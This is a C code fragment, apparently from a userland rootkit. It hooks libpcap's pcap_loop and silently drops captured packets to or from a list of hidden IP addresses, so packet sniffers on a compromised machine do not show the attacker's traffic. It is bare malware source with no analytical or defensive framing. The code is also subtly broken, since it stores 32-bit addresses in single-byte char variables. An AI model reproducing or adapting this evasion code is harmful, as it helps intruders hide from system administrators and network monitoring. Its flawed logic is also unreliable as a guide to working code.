void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	const struct sniff_ip *ip;
	int size_ip;
	char sip, dip;
	ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
	if((size_ip = IP_HL(ip) * 4) < 20)
		return;
	sip = ip->ip_src.s_addr;
	dip = ip->ip_dst.s_addr;
	if(is_hidden_ip(int_ip2hex(sip)) || is_hidden_ip(int_ip2hex(dip)))
		return;
	else if(o_callback)
		o_callback(args, header, packet);
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user){
	o_callback = callback;
	hook(CPCAP_LOOP);
	return (long)call(CPCAP_LOOP, p, cnt, got_packet, user);
}
